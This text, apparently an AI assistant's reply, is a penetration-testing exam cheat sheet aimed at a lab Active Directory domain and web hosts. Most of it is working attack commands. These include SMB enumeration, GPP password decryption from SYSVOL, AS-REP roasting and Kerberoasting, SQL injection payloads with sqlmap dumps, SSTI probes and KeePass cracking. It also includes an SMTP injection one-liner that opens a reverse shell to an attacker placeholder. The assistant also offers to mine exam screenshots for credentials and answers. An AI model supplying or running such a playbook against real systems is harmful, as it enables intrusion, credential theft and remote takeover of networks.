+crackmapexec smb 172.31.40.162 -u jsmith -p pa55w0rd --shares --sessions --users
+
+# If domain to be explicit
+crackmapexec smb 172.31.40.162 -d hq.vanguard.bank -u jsmith -p pa55w0rd --shares
+
+# Pull SYSVOL then decrypt GPP
+smbclient //172.31.40.162/SYSVOL -U 'hq.vanguard.bank\jsmith%pa55w0rd' -c 'recurse ON; prompt OFF; mget *'
+grep -i cpassword -R SYSVOL | awk -F'cpassword=|"' '{print $3}' | while read C; do gpp-decrypt "$C"; done
+```
+
+---
+
+# Optional add‑ons I can drop in next
+
+- A **one‑pager** just for ``** SQLi**: exact payloads, `sqlmap` commands, and where to click in DevTools to pick up the profile/flag requests.
+- A **Werkzeug/Flask 45656** cheat (debug PIN derivation path + SSTI probe chain).
+- A **KeePass hunt + crack** page with example `keepass2john`/`john` commands and key‑file checks.
+
+> Upload the remaining 8 screenshots and I’ll extract anything new (version strings, errors, creds) and wire those into the capture sheet + playbooks. If you want, I can also append a printable Exam Day Checklist (fits on one screen).
+> 
+
+---
+
+# Exam Day One‑Pager (print/one screen)
+
+**Order of operations (checkboxes)**
+
+**Golden one‑liners**
+
+- **GPP decrypt:** `grep -i cpassword -R SYSVOL | awk -F'cpassword=|"' '{print $3}' | while read C; do gpp-decrypt "$C"; done`
+- **LDAP count (DC02):** `ldapsearch -x -H ldap://172.31.40.162 -D 'hq.vanguard.bank\jsmith' -w 'pa55w0rd' -b 'DC=hq,DC=vanguard,DC=bank' '(objectClass=user)' sAMAccountName | grep ^sAMAccountName | wc -l`
+- **AS‑REP:** `GetNPUsers.py hq.vanguard.bank/ -dc-ip 172.31.40.162 -usersfile dc02_users.txt -format hashcat -no-pass -outputfile asrep.txt`
+- **Kerberoast:** `GetUserSPNs.py hq.vanguard.bank/jsmith:'pa55w0rd' -dc-ip 172.31.40.162 -request -outputfile tgs.txt`
+- **SMTP manual RCE:** `(echo "EHLO x"; sleep 1; echo "MAIL FROM:<;bash -i >& /dev/tcp/ATTACKER/4444 0>&1;>"; sleep 1; echo "RCPT TO:<root@localhost>"; sleep 1; echo "DATA"; sleep 1; echo "."; sleep 1; echo "QUIT") | nc -nv 172.31.37.55 25`
+
+**Timeboxes**
+
+- Web path: **≤25 min** to first shell → else switch.
+- AD path: **≤35 min** to first elevated cred → else switch.
+- Brute force: **≤10 min** fasttrack only.
+
+**Sanity checks**
+
+- LHOST is your **Kali IP** (not 172.31.x.x).
+- Screenshots of: flags, `whoami`, group membership, plugin/version strings.
+
+---
+
+# `target.line.local` – SQLi Mini‑Playbook
+
+**Login form (username‑only SQLi):**
+
+1. In DevTools → Network, capture a real **/login** POST and save as `request.txt`.
+2. Try quick bypass in user field: `' OR 1=1 -- -` or `' OR '1'='1` and note which user you land as.
+3. Use `sqlmap` on the captured request:
+
+```
+sqlmap -r request.txt --batch --risk=2 --level=2 --dbs
+sqlmap -r request.txt -D <db> -T users --columns --batch
+sqlmap -r request.txt -D <db> -T users -C id,username,email,password --dump --batch
+```
+
+1. If WAF-ish filters: add `-tamper=space2comment,between,equaltolike`.
+
+**Search page (**``**):**
+
+- Delete `maxlength` attr in the DOM, then test `' OR 1=1 -- -`.
+- Speed‑UNION probe: `' UNION SELECT 1,2,3-- -` then adjust column count.
+- Once UNION works, pivot to file read or enumeration endpoints used by the app (watch Network tab for `/profile/<id>` etc.).
+
+**Answer tips:** capture **DB name**, **user count**, and any **flags** returned in results. Keep screenshots.
+
+---
+
+# Werkzeug/Flask :45656 – Quick Checks
+
+- `curl -i http://172.31.37.101:45656/` → look for Flask clues (Server, routes).
+- Probe **SSTI** on any reflected field: `{{7*7}}` → expect `49` if Jinja2 injection.
+- If a **debugger** page appears but asks for a PIN, note: guessing PIN requires local machine info; don’t sink time unless you can read local files via another bug.
+- Map routes quickly with `ffuf` and hit `/console`, `/debug`, `/admin`, `/api/*`.
+
+---
+
+# KeePass Hunt & Crack (from FILESRV01/DCs)
+
+1. Hunt files after pulling shares:
+
+```
+grep -iE '\.[kK][dD][bB][xX]|\.[kK][dD][bB]|KeePass|KeePass.config|\.[kK][eE][yY][xX]?$' -R SYSVOL NETLOGON 2>/dev/null
+```
+
+1. Extract and crack:
+
+```
+keepass2john vault.kdbx > kp.hash
+john kp.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=single --fork=4
+```
+
+> If a key file exists (*.key/*.keyx), you’ll need it with the DB.
+> 
+1. Also check plaintext hints in configs/notes (`.xml`, `.txt`).
+
+---
+
+# Common Pitfalls → Fix Fast
+
+- Metasploit reverse shells failing → **use simple bash/perl/python** one‑liners, change egress ports, verify listener.
+- RDP retries eating time → limit to **2–3 tries** per credential set; move on.
+- RockYou brute forcing → don’t; stick to **fasttrack**; use **season+year** patterns sparingly.
+- LDAP counts including built‑ins → remember to **exclude Administrator, Guest, krbtgt** to answer correctly.
+
+---
+
+# “Answer Capture” – Compact Table (copy/paste into answers.txt)
+
+```
+PDC IP: [ ]
+Linux hosts #: [ ]   Windows hosts #: [ ]   DCs #: [ ]
+Apache (WP): 2.4.41   WP ver: 6.7.1   WP users (no admin): [ ]
+8080 app/version: [ ]   vuln type: [ ]
+SMTP vuln type: [ ]   decoded flag: [ ]
+MySQL root pw: [ ]   wp_users count: [ ]   hash alg: [ ]   DB flag (decoded): [ ]
+Domain users total (excl Adm/Guest/krbtgt): [ ]
+Employees OU groups #: [ ]   noah group: [ ]
+Spray‑susceptible user: [ ]   spray‑vuln users #: [ ]
+AS‑REP roastable acct(s): [ ]   hashcat mode used: 18200
+Hashcat Kerberoast mode: 13100
+WS01 PE vuln: [ ]   WS01 Admin clear‑text: [ ]
+FILESRV01 local RDP user: [ ]   nathan password: [ ]
+Cred file DC name (AB12): [ ]   DC02 local Admin pw: [ ]
+Enterprise Admin name(s): [ ]   password: [ ]
+DC01 flag (C:\Users\Administrator\Desktop\flag.txt): [ ]
+```
+
+---
+
+# 48‑Hour Prep Plan (quick)
+
+**Today**
+
+- Dry‑run the **one‑pager** end‑to‑end on a timer (90 min).
+- Build `dc02_users.txt` and test `GetNPUsers.py`/`GetUserSPNs.py` syntax locally.
+- Verify **listeners** and a small **egress ports list** (4444/443/53/8080).
+
+**Tomorrow**
+
+- Practice the **GPP decrypt** workflow on a sample SYSVOL dump.
+- Rehearse the **SQLi mini‑playbook** with a throwaway target to solidify muscle memory.
+- Prep `answers.txt` template; bind hotkeys for screenshot tool.
